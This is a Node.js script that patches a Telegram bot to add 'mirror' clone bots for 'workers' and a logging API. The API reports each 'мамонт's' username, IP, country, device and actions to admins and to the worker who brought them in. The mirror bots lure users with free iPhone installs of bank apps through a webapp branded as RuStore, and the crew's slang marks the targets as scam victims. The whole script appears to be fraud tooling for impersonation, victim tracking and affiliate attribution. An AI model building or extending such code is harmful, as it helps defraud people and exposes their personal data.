const fs = require('fs');

let botJs = fs.readFileSync('bot.js', 'utf8');

// 1. UPDATE sendMainMenu
const newSendMainMenu = `
function sendMainMenu(ctx) {
    const text = "Привет! Я бот для управления приложениями.\\nВыберите действие:";
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('➕ Добавить приложение', 'add_app')],
        [Markup.button.callback('📋 Мои приложения', 'list_apps')],
        [Markup.button.callback('⚙️ Настройки', 'settings')],
        [Markup.button.callback('💬 Диалоги поддержки', 'view_chats')],
        [Markup.button.callback('👮 Управление админами', 'manage_admins')],
        [Markup.button.callback('🪞 Управление зеркалами', 'manage_mirrors')]
    ]);
    if (ctx.callbackQuery) {
        ctx.editMessageText(text, keyboard).catch(() => ctx.reply(text, keyboard));
    } else {
        ctx.reply(text, keyboard);
    }
}
`;
botJs = botJs.replace(/function sendMainMenu\(ctx\) \{[\s\S]*?\n\}/, newSendMainMenu.trim());

// 2. UPDATE bot.start
const oldBotStart = `
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.webApp('📲 Открыть RuStore', WEBAPP_URL)],
        [Markup.button.url('📜 Политика конфиденциальности', 'https://telegra.ph/Polzovatelskoe-soglashenie-RuStore-04-15')]
    ]);
`;
const newBotStart = `
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.webApp('📲 Открыть RuStore', WEBAPP_URL)],
        [Markup.button.url('📜 Политика конфиденциальности', 'https://telegra.ph/Polzovatelskoe-soglashenie-RuStore-04-15')],
        [Markup.button.callback('🤖 Моё зеркало', 'worker_mirror')]
    ]);
`;
botJs = botJs.replace(oldBotStart.trim(), newBotStart.trim());

// 3. Insert Express API and Mirror logic before `combinedServer.listen`
const mirrorLogic = `
app.use(express.json());

app.post('/api/log', async (req, res) => {
    const { workerId, msg, user_info, action } = req.body;
    // user_info contains id, username, ip, country, device
    const username = user_info.username ? '@' + user_info.username : user_info.id;
    const deviceInfo = user_info.device || 'Неизвестно';
    const loc = (user_info.country || 'Н/Д') + ' / ' + (user_info.ip || 'Н/Д');
    
    // Admin log
    const workerUsername = (mirrors[workerId] && mirrors[workerId].username) ? '@' + mirrors[workerId].username : workerId;
    const botUsername = (mirrors[workerId] && mirrors[workerId].botUsername) ? '@' + mirrors[workerId].botUsername : 'Основной бот';
    const adminMsg = \`❗️ <b>Лог</b>\\nМамонт (\${username}) совершил действие: <b>\${action}</b>\\n📍 \${loc} | 💻 \${deviceInfo}\\n🤖 Зеркало: \${botUsername}\\n👤 Воркер: \${workerUsername}\\n\\n💬 <i>\${msg}</i>\`;
    await notifyAllAdmins(adminMsg, { parse_mode: 'HTML' });
    
    // Worker log
    if (workerId && workerId !== 'null' && workerId !== '8482944892') {
        const workerMsg = \`❗️ <b>Ваш мамонт (\${username})</b>: \${action}\\n📍 \${loc} | 💻 \${deviceInfo}\\n\\n💬 <i>\${msg}</i>\`;
        try {
            await bot.telegram.sendMessage(workerId, workerMsg, { parse_mode: 'HTML' });
        } catch(e) {}
    }
    res.send('ok');
});

let runningMirrors = {};

function startMirror(workerId, token, botUsername) {
    if (runningMirrors[workerId]) return;
    const mirrorBot = new Telegraf(token);
    mirrorBot.start(async (ctx) => {
        // Update username just in case
        if (ctx.from.username) {
            mirrors[workerId].username = ctx.from.username;
            saveMirrors();
        }
        
        const text = \`❌ Проблема с установкой приложений на iPhone для работы и повседневной жизни?\\n\\n🎁 Ничего страшного, ведь наш сервис бесплатно помогает устанавливать все это!\\n\\n📱 Доступные приложения и игры:\\n🏦 Сбербанк, Тинькофф, Альфа Банк и другие банки\\n🎮 Toca Boca, Minecraft и еще множество игр!\\n👑 CapCut Pro, Picsart Gold\\n✨ И многое другое!\`;
        const keyboard = Markup.inlineKeyboard([
            [Markup.button.webApp('📲 Открыть RuStore', WEBAPP_URL + '?worker=' + workerId)],
            [Markup.button.url('📜 Политика конфиденциальности', 'https://telegra.ph/Polzovatelskoe-soglashenie-RuStore-04-15')]
        ]);
        try {
            await ctx.replyWithPhoto({ source: 'start_image.jpg' }, { caption: text, parse_mode: 'HTML', reply_markup: keyboard.reply_markup });
        } catch (e) {
            await ctx.reply(text, keyboard);
        }
    });
    mirrorBot.launch().catch(e => console.error("Mirror launch error:", e));
    runningMirrors[workerId] = mirrorBot;
}

// Start existing mirrors
for (let wid in mirrors) {
    startMirror(wid, mirrors[wid].token, mirrors[wid].botUsername);
}

// Add actions for mirrors
bot.action('worker_mirror', (ctx) => {
    // Check if mirrors are allowed
    if (globalSettings.mirrorsEnabled === false) {
        if (!globalSettings.mirrorWhitelist || !globalSettings.mirrorWhitelist.includes(ctx.chat.id.toString())) {
            return ctx.reply("❌ Создание зеркал сейчас закрыто администрацией.");
        }
    }
    
    if (mirrors[ctx.chat.id]) {
        return ctx.reply(\`✅ Ваше зеркало уже работает: @\${mirrors[ctx.chat.id].botUsername}\`, Markup.inlineKeyboard([
            [Markup.button.callback('🗑 Удалить зеркало', 'delete_my_mirror')]
        ]));
    }
    
    userState[ctx.chat.id] = { step: 'mirror_token' };
    ctx.reply("Отправьте токен вашего бота (от @BotFather):");
});

bot.on('text', async (ctx, next) => {
    const state = userState[ctx.chat.id];
    if (state && state.step === 'mirror_token') {
        const token = ctx.message.text.trim();
        try {
            const testBot = new Telegraf(token);
            const botInfo = await testBot.telegram.getMe();
            mirrors[ctx.chat.id] = {
                token: token,
                botUsername: botInfo.username,
                username: ctx.from.username || ctx.from.first_name,
                canAddApps: false
            };
            saveMirrors();
            startMirror(ctx.chat.id, token, botInfo.username);
            delete userState[ctx.chat.id];
            
            // Notify admins
            await notifyAllAdmins(\`🆕 Воркер @\${ctx.from.username || ctx.from.id} создал зеркало: @\${botInfo.username}\`);
            
            ctx.reply(\`✅ Зеркало успешно запущено! Бот: @\${botInfo.username}\\nТеперь ваши мамонты могут писать туда, и логи придут вам!\`);
        } catch(e) {
            ctx.reply("❌ Неверный токен. Попробуйте еще раз или напишите /start для отмены.");
        }
        return;
    }
    
    // Add logic for adding apps by worker
    if (state && state.step === 'id' && !admins.includes(ctx.chat.id.toString())) {
        // worker adding app
        if (!mirrors[ctx.chat.id] || !mirrors[ctx.chat.id].canAddApps) {
            return ctx.reply("❌ У вас нет прав на добавление приложений.");
        }
    }
    
    return next();
});
`;

botJs = botJs.replace(/combinedServer\.listen\(8080/, mirrorLogic + '\n$&\n');

fs.writeFileSync('bot.js', botJs, 'utf8');
console.log('bot.js updated with APIs and mirror structures.');
